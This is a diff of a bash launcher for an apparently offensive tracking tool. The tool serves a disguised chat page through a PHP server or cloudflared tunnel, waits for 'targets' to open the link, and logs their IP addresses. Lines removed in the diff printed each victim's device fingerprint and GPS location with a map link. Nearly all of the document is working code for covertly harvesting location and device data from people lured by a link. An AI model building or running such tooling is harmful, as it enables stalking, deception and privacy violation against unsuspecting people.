@@ -15,8 +15,10 @@ printf '       ██████  ██   ██  █████   ███�
 printf '\e[1;31m ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n\n'
 }
 
+
 dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 
+
 }
 
 stop() {
@@ -36,66 +38,35 @@ fi
 exit 1
 }
 
-# Function to catch the IP of the target
 catch_ip() {
-    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-    IFS=$'\n'
-    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-    cat ip.txt >> saved.ip.txt
+
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+cat ip.txt >> saved.ip.txt
+
 }
 
-# Function to continuously check for interaction and call catch_ip()
 checkfound() {
-    printf "\n"
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets, Press Ctrl + C to exit...\e[0m\n"
-    while [ true ]; do
-        if [[ -e "ip.txt" ]]; then
-            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-            catch_ip
-            rm -rf ip.txt
-            tail -f -n 110 data.txt
-        fi
-        sleep 0.5
-    done
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+catch_ip
+rm -rf ip.txt
+tail -f -n 110 data.txt
+fi
+sleep 0.5
+done 
 }
 
-# Custom report generation function
-generate_report() {
-    printf "\n--- Information Gathering Report ---\n\n"
-    
-    printf "Device Information\n"
-    printf "----------------------------\n"
-    printf "User Agent: %s\n" "$user_agent"
-    printf "Platform: %s\n" "$platform"
-    printf "Cookies Enabled: %s\n" "$cookies"
-    printf "Browser Language: %s\n" "$browser_lang"
-    printf "Browser: %s\n" "$browser_name"
-    printf "RAM: %s GB\n" "$ram"
-    printf "CPU Cores: %s\n" "$cpu_cores"
-    printf "Screen Resolution: %sx%s\n" "$screen_width" "$screen_height"
-    printf "Local Time: %s\n" "$local_time"
-    printf "\n"
-    
-    if [ ! -z "$lat" ] && [ ! -z "$long" ]; then
-        printf "GPS Coordinates\n"
-        printf "-----------------------\n"
-        printf "Latitude: %s\n" "$lat"
-        printf "Longitude: %s\n" "$long"
-        printf "Map Location: https://www.google.com/maps/place/%s,%s\n" "$lat" "$long"
-        printf "\n"
-    else
-        printf "User denied the Geolocation permission.\n"
-        printf "\n"
-    fi
-    
-    printf "Target IP Details\n"
-    printf "----------------\n"
-    printf "IP: %s\n" "$ip"
-    printf "---------------\n"
-}
 
-# Function to start Cloudflare server and fetch the direct link
 cf_server() {
+
 if [[ -e cloudflared ]]; then
 echo "Cloudflared already installed."
 else
@@ -132,7 +103,6 @@ sed 's+forwarding_link+'$link'+g' template.php > index.php
 checkfound
 }
 
-# Function to run the local server without Cloudflare
 local_server() {
 sed 's+forwarding_link+''+g' template.php > index.php
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8080...\n"
@@ -140,9 +110,7 @@ php -S 127.0.0.1:8080 > /dev/null 2>&1 &
 sleep 2
 checkfound
 }
-
-# Main logic to initiate the tool
-ghostcat() {
+hound() {
 if [[ -e data.txt ]]; then
 cat data.txt >> targetreport.txt
 rm -rf data.txt
@@ -153,7 +121,7 @@ rm -rf ip.txt
 fi
 sed -e '/tc_payload/r payload' index_chat.html > index.html
 default_option_server="Y"
-read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
+read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
 cf_server
@@ -163,6 +131,7 @@ local_server
 sleep 1
 fi
 }
+
 
 banner
 dependencies
